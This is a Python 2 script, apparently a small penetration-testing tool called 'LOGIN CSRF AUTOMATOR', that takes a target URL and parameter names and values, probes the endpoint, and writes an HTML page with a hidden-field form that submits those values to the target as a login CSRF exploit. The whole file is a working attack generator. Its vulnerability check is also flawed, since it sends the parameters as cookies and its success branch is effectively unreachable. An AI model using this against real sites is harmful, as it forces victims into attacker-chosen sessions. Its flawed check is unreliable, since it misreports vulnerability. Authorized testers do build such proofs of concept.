#!/bin/env/python2.7

import requests
import sys


class colors: 
    reset='\033[0m'
    class fg: 
        red='\033[31m'
        green='\033[32m'
        orange='\033[33m'
        blue='\033[34m'
        purple='\033[35m'
        cyan='\033[36m'
        lightgrey='\033[37m'
        darkgrey='\033[90m'
        lightred='\033[91m'
        lightgreen='\033[92m'
        yellow='\033[93m'
        lightblue='\033[94m'
        pink='\033[95m'


print colors.fg.purple + "==============LOGIN CSRF AUTOMATOR v1.0==================" + colors.reset
print colors.fg.purple + "\t\t\t\t\tCreator : Adwaith" + colors.reset
def choicecheck(choice, target,variables,POC_content):
	 if choice.lower() == 'y':
		POC(choice, target, variables,POC_content)
	 else:
		exit(0)


def POC(choice, target, variables,POC_content):
	try:
		file = open("csrf_automate.html", "a")
		content = '''<!-- Author : Adwaith -->
<html>
<body>
<form action="{0}" method="POST">'''.format(target)
		file.write(content)
		file.write("\n")
		for i in range(variables):
			file.write(POC_content[i])
			file.write("\n")
		content2 = '''<input type="submit" value="Submit request" />
</form>
</body>
</html>'''
		file.write(content2)
		file.close()
		print "[+] csrf_automate.html successfully created!"
		exit(0)
	except Exception:	
		print colors.fg.red + "[-] Error occured while creating POC!" + colors.reset

POC_content = []
POC_init = '<input type="hidden" name="{0}" value="{1}">'

try:
	variables = sys.argv[1]
except Exception:
	print colors.fg.red + "[-] python csrf.py <no. of POST params>" + colors.reset
	exit(0)
	
parameter_list = []
value_list = []
cookies = {}

target = raw_input(colors.fg.orange + "Enter the target(eg: domain.com/vulnendpoint):" + colors.reset)
if "https://" in target:
	pass
elif "http://" in target:
	pass
else:
	target = "https://" + target


variables = int(variables)

i=0
for i in range(variables):
	temp = raw_input(colors.fg.blue + "Enter the name of parameter" + str(i+1) + ":" + colors.reset)
	parameter_list.append(temp)


i=0
for i in range(variables):
	print colors.fg.cyan + "Enter the vaue of " + parameter_list[i] + ":" + colors.reset
	temp = raw_input()
	value_list.append(temp)
	POC_content.append(POC_init.format(parameter_list[i], value_list[i]))

print colors.fg.blue + "[+] Verifying the beahviour" + colors.reset

for i in range(variables):
	cookies[parameter_list[i]] = value_list[i]

try:
	post_request = requests.post(target, cookies=cookies)
except Exception:
	print colors.fg.red + "[-] Error while connecting to" + " " + target + colors.reset
	print colors.fg.red + '''[-] Possible errors: *Internet connection
			*Recheck the target entered''' + colors.reset
	exit(0)

flag = 0
if post_request.status_code == 200:
	for i in range(variables):
		if value_list[i] in post_request.text:
			flag = flag + 1
		else:
			pass
	print colors.fg.red + "[?] Unable to determine whether vulnerable!" + colors.reset
	print colors.fg.red + "[-] Verfiy manually!\n" + colors.reset
	choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
	choicecheck(choice, target,variables,POC_content)


if flag != 0:
	print colors.fg.green + "[+] Vulnerable to CSRF login!" + colors.reset
	choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
	choicecheck(choice, target,variables,POC_content)
else:
	print colors.fg.red + "[?] Unable to determine whether vulnerable!" + colors.reset
	print colors.fg.red + "[-] Verfiy manually!\n" + colors.reset
	choice = raw_input(colors.fg.yellow + "[+] Create the exploit POC for manual exploitation? (y/n)" + colors.reset)
	choicecheck(choice, target,variables,POC_content)
